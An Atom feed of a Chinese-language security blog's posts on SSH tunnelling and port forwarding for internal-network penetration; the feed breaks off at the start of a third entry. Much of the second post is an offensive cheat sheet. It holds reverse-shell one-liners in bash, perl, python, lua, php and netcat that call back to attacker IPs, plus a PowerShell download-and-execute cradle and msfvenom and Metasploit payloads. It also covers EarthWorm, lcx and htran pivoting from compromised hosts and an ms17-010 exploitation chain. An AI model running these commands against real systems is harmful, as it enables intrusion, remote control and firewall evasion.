<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sparrow&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://sp4rr0w.github.io/"/>
  <updated>2018-03-28T01:33:12.427Z</updated>
  <id>https://sp4rr0w.github.io/</id>
  
  <author>
    <name>Sparrow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>端口转发之SSH隧道</title>
    <link href="https://sp4rr0w.github.io/2018/03/29/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B9%8BSSH%E9%9A%A7%E9%81%93/"/>
    <id>https://sp4rr0w.github.io/2018/03/29/端口转发之SSH隧道/</id>
    <published>2018-03-29T19:20:00.000Z</published>
    <updated>2018-03-28T01:33:12.427Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ssh隧道有3种类型"><a href="#0x01-ssh隧道有3种类型" class="headerlink" title="0x01 ssh隧道有3种类型"></a>0x01 ssh隧道有3种类型</h2><a id="more"></a><pre><code>动态端口转发（Socks 代理）本地端口转发远程端口转发</code></pre><h2 id="0x01-本地端口转发"><a href="#0x01-本地端口转发" class="headerlink" title="0x01 本地端口转发"></a>0x01 本地端口转发</h2><p>通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。</p><p>已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口）</p><pre><code>host1 : 本地主机host2 : 远程主机（目的主机）host3 : host1  &lt;-&gt; host2  (都不通)host3同时连通前面两台主机host1  -&gt; host2   (最终目的)</code></pre><p>想法就是，通过host3，将host1连上host2</p><p>我们在host1执行下面的命令：</p><pre><code>$ ssh -L 2121:host2:21 host3</code></pre><p>命令中的L参数一共接受三个值，分别是”本地端口:目标主机:目标主机端口”，它们之间用冒号分隔。</p><p>这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，</p><p>转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。</p><p>这样一来，在host1连接本地的2121端口，就等于连上了host2的21端口。</p><pre><code>$ ftp localhost:2121$ ssh -p 2121 localhost   (21端口改为22)</code></pre><p>优点</p><pre><code>无需设置代理</code></pre><p>缺点</p><pre><code>每个服务都需要配置不同的端口转发</code></pre><h2 id="0x02-动态端口转发"><a href="#0x02-动态端口转发" class="headerlink" title="0x02 动态端口转发"></a>0x02 动态端口转发</h2><p>既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性</p><p>动态端口允许通过配置一个本地端口，把通过隧道到数据转发到远端的所有地址。</p><p>本地的应用程序需要使用Socks协议与本地端口通讯。此时SSH充当Socks代理服务器的角色。</p><p>假定我们要让8080端口的数据，都通过SSH传向远程主机：</p><pre><code>$ ssh -D 8080 user@host</code></pre><p>SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到</p><p>SSH连接上面，发往远程主机。</p><p>可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。</p><p>优点</p><pre><code>配置一个代理服务就可以访问远端机器和与其所在子网络的所有服务</code></pre><p>缺点</p><pre><code>应用程序需要额外配置SOCKS代理，若应用程序不支持代理配置则无法使用</code></pre><h2 id="0x03-远程端口转发"><a href="#0x03-远程端口转发" class="headerlink" title="0x03 远程端口转发"></a>0x03 远程端口转发</h2><p>远程端口转发用于某些单向阻隔的内网环境，比如说NAT，网络防火墙。<br>在NAT设备之后的内网主机可以直接访问公网主机，但外网主机却无法访问内网主机的服务。<br>如果内网主机向外网主机建立一个远程转发端口，就可以让外网主机通过该端口访问该内网主机的服务。<br>可以把这个内网主机理解为“内应”和“开门者”。</p><pre><code>host1 ： 外网机器host2 ： 目的主机host3 ： 内网机器host3  -&gt; host1  (通)host1  -&gt; host3  (不通)host1  -&gt; host2  (最终目的)</code></pre><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了</p><p>在host3执行下面的命令：</p><pre><code>$ ssh -R 2121:host2:22 root@host1-R : &quot;远程主机端口:目标主机:目标主机端口&quot;。</code></pre><p>host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。<br>由于对于host3来说，host1是远程主机，所以这种情况就被称为”远程端口绑定”。<br>在host1就可以连接host2了：</p><pre><code>$ ssh localhost:2121</code></pre><p>如果host3是目的主机的话，即源主机是目的主机，我们的目的是host1-&gt;host3 (通)<br>则：<br>    在host3上执行： ssh -NfR 2121:localhost:22 user@host1 -p 22<br>    将host3的22端口和host1的2121端口绑定，相当于远程端口映射<br>    在host1就可以连接host3了：</p><pre><code>    $ ssh localhost -p 2121也可以在host2上：    $ ssh host1 -p 2121</code></pre><p>优点</p><pre><code>可以穿越防火墙和NAT设备</code></pre><p>缺点</p><pre><code>每个服务都需要配置不同的端口转发</code></pre><p>如何禁止端口转发</p><p>设置ssh服务配置文件/etc/ssh/sshd_config</p><pre><code>AllowTcpForwarding no</code></pre><h2 id="0x04-简而言之"><a href="#0x04-简而言之" class="headerlink" title="0x04 简而言之"></a>0x04 简而言之</h2><pre><code>http://staff.washington.edu/corey/fw/ssh-port-forwarding.html本地访问127.0.0.1:port1就是host:port2(用的更多)ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发访问host:port2就是访问127.0.0.1:port1ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port可以将dmz_host的hostport端口转发到remote_ip的port端口ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</code></pre><h2 id="0x05-SSH-穿透"><a href="#0x05-SSH-穿透" class="headerlink" title="0x05 SSH 穿透"></a>0x05 SSH 穿透</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user@IP Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains commands target </code></pre><p>SSH 穿透从一个网络到另一个网络</p><pre><code>ssh -D 127.0.0.1:1080 -p 22 user1@IP1 Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 Add socks4 127.0.0.1 1081 in /etc/proxychains.conf proxychains commands target </code></pre><p>使用 metasploit 进行穿透</p><pre><code>route add X.X.X.X 255.255.255.0 1 use auxiliary/server/socks4a run proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</code></pre><p>或者</p><pre><code># http://www.offensive-security.com/metasploit-unleashed/pivoting/meterpreter &gt; ipconfig IP Address  : 10.1.13.3 meterpreter &gt; run autoroute -s 10.1.13.0/24 meterpreter &gt; run autoroute -p 10.1.13.0          255.255.255.0      Session 1 meterpreter &gt; Ctrl+Z msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set RHOST 10.1.13.2 msf exploit(psexec) &gt; exploit meterpreter &gt; ipconfig IP Address  : 10.1.13.2 </code></pre><p>扩展：</p><pre><code>通过VPS SSH隧道使用本地msfhttps://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</code></pre><p>from :<br>    三种不同类型的ssh隧道<br>    <a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a><br>    ssh用法及命令<br>    <a href="http://blog.csdn.net/pipisorry/article/details/52269785" target="_blank" rel="noopener">http://blog.csdn.net/pipisorry/article/details/52269785</a><br>    ssh隧道建立<br>    <a href="http://blog.csdn.net/yuanchao99/article/details/72877586" target="_blank" rel="noopener">http://blog.csdn.net/yuanchao99/article/details/72877586</a><br>    xxxx<br>    <a href="https://xianzhi.aliyun.com/forum/topic/142" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/142</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-ssh隧道有3种类型&quot;&gt;&lt;a href=&quot;#0x01-ssh隧道有3种类型&quot; class=&quot;headerlink&quot; title=&quot;0x01 ssh隧道有3种类型&quot;&gt;&lt;/a&gt;0x01 ssh隧道有3种类型&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="端口转发" scheme="https://sp4rr0w.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="SSH隧道" scheme="https://sp4rr0w.github.io/tags/SSH%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>端口转发总结</title>
    <link href="https://sp4rr0w.github.io/2018/03/27/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/"/>
    <id>https://sp4rr0w.github.io/2018/03/27/端口转发总结/</id>
    <published>2018-03-27T20:58:00.000Z</published>
    <updated>2018-03-28T01:35:54.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-传统反弹与网络发现"><a href="#0x01-传统反弹与网络发现" class="headerlink" title="0x01 传统反弹与网络发现"></a>0x01 传统反弹与网络发现</h2><a id="more"></a><p><strong>协议的判断</strong></p><p>主要是看能够通过什么协议出去，主要有tcp\http\dns\icmp等协议。常见判断手法如下：</p><p>tcp协议</p><pre><code>外网vps : nc –lvp port内网机器：nc ip port</code></pre><p>dns协议</p><pre><code>外网vps: nc –u –lvp 53内网机器:windows: nslookup www.baidu.com vps-iplinux：dig @vps-ip www.baidu.com</code></pre><p>http协议</p><pre><code>外网vps : nc –lvp 80 (or 8080等)内网机器 ： curl vps-ip:8080</code></pre><p>icmp协议</p><pre><code>外网vps：抓包、tcpdump icmp内网机器:直接ping</code></pre><p><strong>端口的判断</strong></p><p>外网vps做监听，内网机器测试常见端口，或直接使用端口扫描器进行扫描。</p><p>常见能出去的端口有80,8080,443,53,110,123等。</p><p><strong>额外情况–代理服务器</strong><br>还有一种是机器不能直接出来的，需要进行代理设置，这种多数是为了办公网段得办公人员进行上网用的。</p><p>常用的判断手法与情况如下：</p><pre><code>查看网络连接看是否有连接其他机器的8080（不绝对）等端口，尝试ping –n 1 –a ip是否有hostname类似于proxy的机器IE直接代理情况</code></pre><p>可以通过查询注册表得到：</p><pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServerreg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><p>通过pac文件自动代理情况</p><pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL</code></pre><p>我们可以通过pac文件的路径（可能是本地路径或远程路径）将pac文件下载回来查看，例如某pac文件如下：从中我们能看到其带来服务器为172.16.10.168:8080</p><pre><code>    function islocalip(ip) {           return isInNet(ip, &quot;127.0.0.0&quot;, &quot;255.0.0.0&quot;) ||                     isInNet(ip, &quot;169.254.0.0&quot;, &quot;255.255.0.0&quot;) ||                     isInNet(ip, &quot;10.0.0.0&quot;, &quot;255.0.0.0&quot;) ||                     isInNet(ip, &quot;192.168.0.0&quot;, &quot;255.255.0.0&quot;) ||                     }    function FindProxyForURL(url, host) {           var DefaultScanner = &quot;PROXY 172.16.10.168:8080; DIRECT&quot;;           var target_ip = dnsResolve(host);           if (islocalip(target_ip)) {                         return &#39;DIRECT&#39;;           } else {                  return DefaultScanner;           }    }</code></pre><p>最终我们可以利用curl进行确定：</p><pre><code>curl        www.baidu.com      //不通 curl –x     proxy-ip:8080 www.baidu.com   //通icmp        ping baidu.com http        curl -i  baidu.com tcp         telnet baidu.com dns         nslookup baidu.com    //当然这里不一定非要百度</code></pre><p>其他反弹</p><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>顺便提下</p><pre><code>searchsploit ms17  |grep py  只匹配py脚本searchsploit -p 41891.rb 复制完整路径并显示详细信息searchsploit -m 41891.rb 复制到当前目录searchsploit -w ms17-010  显示exploit-db在线结果</code></pre><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipephp -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h2 id="0x02-iptables"><a href="#0x02-iptables" class="headerlink" title="0x02 iptables"></a>0x02 iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p><pre><code>net.ipv4.ip_forward = 1</code></pre><p>2、关闭服务</p><pre><code>service iptables stop</code></pre><p>3、配置规则</p><p>需要访问的内网地址：192.168.206.101<br>内网边界web服务器：192.168.206.129</p><pre><code>iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</code></pre><p>4、保存&amp;&amp;重启服务</p><pre><code>service iptables save &amp;&amp; service iptables start</code></pre><h2 id="0x03-EarthWorm-绕防火墙"><a href="#0x03-EarthWorm-绕防火墙" class="headerlink" title="0x03 EarthWorm[绕防火墙]"></a>0x03 EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p><ol><li><p>正向 SOCKS v5 服务器</p><p> $ ./ew -s ssocksd -l 1080</p></li><li><p>反弹 SOCKS v5 服务器<br>这个操作具体分两步：</p><p> a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><pre><code> $ ./ew -s rcsocks -l 1080 -e 8888 </code></pre><p> b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p><pre><code> $ ./ew -s rssocks -d 1.1.1.1 -e 8888 </code></pre></li><li><p>多级级联</p></li></ol><p>工具中自带的三条端口转发指令，<br>它们的参数格式分别为：</p><pre><code>$ ./ew -s lcx_listen -l  1080   -e 8888$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</code></pre><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。<br>首先提供两个“二级级联”本地SOCKS测试样例：</p><pre><code>a) lcx_tran 的用法    $ ./ew -s ssocksd  -l 9999    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999b) lcx_listen、lcx_slave 的用法    $ ./ew -s lcx_listen -l 1080 -e 8888    $ ./ew -s ssocksd    -l 9999    $ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</code></pre><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><pre><code>$ ./ew -s rcsocks -l 1080 -e 8888$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999$ ./ew -s lcx_listen -l 9999 -e 7777$ ./ew -s rssocks -d 127.0.0.1 -e 7777</code></pre><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p><h2 id="0x04-Shell反弹不出-DMZ"><a href="#0x04-Shell反弹不出-DMZ" class="headerlink" title="0x04 Shell反弹不出[DMZ]"></a>0x04 Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=12345 -f exe -o ./shell.exe</code></pre><p>2、本地利用tunna工具进行端口转发</p><pre><code>python proxy.py -u http://xxxx.com/conn.jsp  -l 3333 -r 12345 v</code></pre><p>3、监听</p><pre><code>use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset LPORT 3333</code></pre><h2 id="0x05-SSH隧道"><a href="#0x05-SSH隧道" class="headerlink" title="0x05 SSH隧道"></a>0x05 SSH隧道</h2><p>三种不同类型的ssh隧道</p><p><a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a></p><p>通过VPS SSH隧道使用本地msf<br><a href="https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</a></p><p>本地访问127.0.0.1:port1就是host:port2(用的更多)</p><pre><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</code></pre><p>访问host:port2就是访问127.0.0.1:port1</p><pre><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</code></pre><p>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</p><pre><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port</code></pre><p>可以将dmz_host的hostport端口转发到remote_ip的port端口</p><pre><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip  </code></pre><p>socket代理</p><pre><code>ssh -qTfnN -D port remotehost</code></pre><p>反向隧道，用于内网穿透防火墙限制之类</p><pre><code>-q      #安静模式-T      #不占用shell-f      #后台运行，推荐加-n参数-N      #不执行远程命令</code></pre><p>set RHOST 127.0.0.1</p><h2 id="0x06-Netsh-tcp"><a href="#0x06-Netsh-tcp" class="headerlink" title="0x06 Netsh[tcp]"></a>0x06 Netsh[tcp]</h2><p>添加转发规则</p><pre><code>netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</code></pre><p>删除转发规则</p><pre><code>netsh interface portproxy delete v4tov4 listenport=9090</code></pre><p>查看现有规则</p><pre><code>netsh interface portproxy show all</code></pre><p>xp需要安装ipv6</p><pre><code>netsh interface ipv6 install</code></pre><h2 id="0x07-nc-正向"><a href="#0x07-nc-正向" class="headerlink" title="0x07 nc [正向]"></a>0x07 nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234    nc -e /bin/sh 223.8.200.234 1234    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f     nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 99992、  mknod /tmp/backpipe p    /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe3、  nc.exe -e cmd.exe -lp 1234  [windows]</code></pre><h2 id="0x08-lcx-内网转发"><a href="#0x08-lcx-内网转发" class="headerlink" title="0x08 lcx 内网转发"></a>0x08 lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p><pre><code>本地:lcx.exe -listen 1234 6666</code></pre><p>将目标的3389转发到本地的1234端口</p><pre><code>肉鸡:lcx.exe -slave my_ip 1234 127.0.0.1 3389</code></pre><p>re:最好有个vps</p><h2 id="0x09-reGeorg"><a href="#0x09-reGeorg" class="headerlink" title="0x09 reGeorg"></a>0x09 reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>python reGeorgSocksProxy.py -p 4444 -u <a href="http://xxx.com/tunnel.php" target="_blank" rel="noopener">http://xxx.com/tunnel.php</a><br>vim /etc/proxychains.conf</p><pre><code>socks5 127.0.0.1 4444</code></pre><p>proxychains4 nmap -sT -Pn -n 192.168.1.2</p><h2 id="0x10-Tunna-速度较慢"><a href="#0x10-Tunna-速度较慢" class="headerlink" title="0x10 Tunna[速度较慢]"></a>0x10 Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p><pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v rdesktop 127.0.0.1:1234</code></pre><h2 id="0x11-Linux-portmap-端口映射"><a href="#0x11-Linux-portmap-端口映射" class="headerlink" title="0x11 Linux portmap 端口映射"></a>0x11 Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p><pre><code>./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行ssh 127.0.0.1 -p 7777   #在外网机器上执行</code></pre><p>rtcp.py</p><pre><code>1. 在B服务器上运行：    ./rtcp.py l:10001 l:10002    表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了2. 在A服务器上运行：    ./rtcp.py c:localhost:22 c:222.2.2.2:10001    表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了3. 然后我们就可以这样来访问A服务器的22端口了：    ssh 222.2.2.2 -p 10002    如果报错ssh_exchange_identification: read: Connection reset by peer  解决方法chmod 400 /etc/ssh/*</code></pre><p>tunna</p><pre><code>第一步 运行proxy.py 并指定端口 python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v第二步 本地执行  rdesktop 127.0.0.1:1234python2.7 proxy.py -u http://x.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389   #-a指定内网的机器</code></pre><p>htran<br>正向代理</p><pre><code>服务端      htran.exe -s -bind 8888客户端      SocksCap:SOCKS Version 5 服务端IP:8888</code></pre><p>反向代理</p><pre><code>客户端      htran.exe -s -listen 1234 8888服务端      htran.exe -s -connect 客户端IP 1234客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888</code></pre><p>正向端口转发</p><pre><code>服务端      htran.exe -p -tran 8888 127.0.0.1 3389客户端      RDP 服务端IP:8888</code></pre><p>反向端口转发</p><pre><code>客户端      htran.exe -p -listen 1234 8888服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389客户端      RDP 127.0.0.1:8888</code></pre><p>iptables端口映射</p><pre><code>bashvi /etc/sysctl.conf #将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开启转发功能sysctl -p   #使数据转发功能生效iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 #把本地192.168.46.129的81端口转为目标172,24.20.25的80端口iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   #172.24.20.25:80返回时 将ip修改为192.168.46.129</code></pre><h2 id="0x12-端口转发之PowerShell"><a href="#0x12-端口转发之PowerShell" class="headerlink" title="0x12 端口转发之PowerShell"></a>0x12 端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><pre><code>Victim IP : 192.168.52.1Attacker IP : 192.168.52.129</code></pre><p>1.Reverse shell[tcp]</p><pre><code>Attacker:    nc -lvp 4444Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1    PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444</code></pre><p>2.Bind shell[tcp]</p><pre><code>Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1    PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888Attacker:    PS F:\Shells&gt; . .\powercat.ps1    PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888</code></pre><p>3.Reverse shell[UDP]支持ipv6</p><pre><code>Attacker:    nc -lvup 53Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1    PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53</code></pre><p>4.Bind shell[UDP]</p><pre><code>Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1    PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777Attacker:    nc -vtu 192.168.52.1 7777</code></pre><p>5.HTTPS</p><p><a href="https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1</a></p><p>需要Attacker以管理员身份运行,nishang作者最新的脚本会出现错误</p><pre><code>Attacker:    PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1    PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443Victim:    PS C:\&gt; iex (New-Object Net.WebClient).DownloadString(&quot;http://192.168.52.1/connect&quot;)</code></pre><p>6.DNS shell<br>dnscat2 : <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)<br>powercat: <a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a>)</p><p>dnscat2讲解<br><a href="https://04z.net/2017/07/13/DNS-Tunnel/" target="_blank" rel="noopener">https://04z.net/2017/07/13/DNS-Tunnel/</a></p><pre><code>Attacker:    root@kali:~# ruby dnscat2.rb shellcome.comVictim:    PS F:\Shells&gt; . .\powercat.ps1    PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep</code></pre><h2 id="0x13-metasploit"><a href="#0x13-metasploit" class="headerlink" title="0x13 metasploit"></a>0x13 metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24meterpreter&gt; use auxiliary/server/socks4amsf&gt; route add 192.168.1.0 255.255.255.0 192.168.1.1 [sessionid]</code></pre><h2 id="0x14-防火墙开启的ms17-010"><a href="#0x14-防火墙开启的ms17-010" class="headerlink" title="0x14 防火墙开启的ms17-010"></a>0x14 防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p><pre><code>1、上传EarthWorm转发端口445到指定端口,然后利用eternalblue+Doublepulsar溢出目标8888端口，成功回弹系统权限的shell2、由于防火墙限制（也可能其他），直接添加管理员始终不能成功3、上传工具，获取管理员密码hash破解，成功登陆3389./ew -s lcx_tran -l 8888 -f 127.0.0.1-g 445</code></pre><h2 id="0x15-Socks代理工具"><a href="#0x15-Socks代理工具" class="headerlink" title="0x15 Socks代理工具"></a>0x15 Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p><pre><code>Earthworm            http://rootkiter.com/EarthWormxsocks            https://github.com/5loyd/xsocksShadowSOCKS（影梭）    https://github.com/shadowSOCKSSocksCap64        http://www.sockscap64.com/proxychains        http://proxychains.sourceforge.net/</code></pre><p>from :<br><a href="https://04z.net/2017/07/09/AD-Attacks-Forwarding/" target="_blank" rel="noopener">https://04z.net/2017/07/09/AD-Attacks-Forwarding/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-传统反弹与网络发现&quot;&gt;&lt;a href=&quot;#0x01-传统反弹与网络发现&quot; class=&quot;headerlink&quot; title=&quot;0x01 传统反弹与网络发现&quot;&gt;&lt;/a&gt;0x01 传统反弹与网络发现&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="端口转发" scheme="https://sp4rr0w.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透相关</title>
    <link href="https://sp4rr0w.github.io/2018/01/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/"/>
    <id>https://sp4rr0w.github.io/2018/01/19/域渗透相关/</id>
    <published>2018-01-19T13:10:00.000Z</published>
    <updated>2018-03-28T01:36:13.316Z</updated>
    
